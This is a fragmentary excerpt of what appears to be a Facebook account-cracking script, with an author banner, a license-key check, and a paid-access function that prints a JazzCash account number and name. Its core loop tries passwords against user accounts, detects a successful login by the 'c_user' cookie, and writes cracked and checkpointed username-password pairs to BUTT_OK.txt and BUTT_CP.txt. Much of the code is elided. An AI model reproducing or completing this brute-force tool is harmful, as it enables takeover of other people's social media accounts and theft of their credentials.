...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.wasi.txt', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("[*]--------------------------------------------------------------")
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Habib
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Habib Butt
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Itx Habib
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [BUTT-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('BUTT_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [BUTT-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BUTT_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number 03016552479\n')
        print('\rAccount Name sami ullah\n')
        print
        print
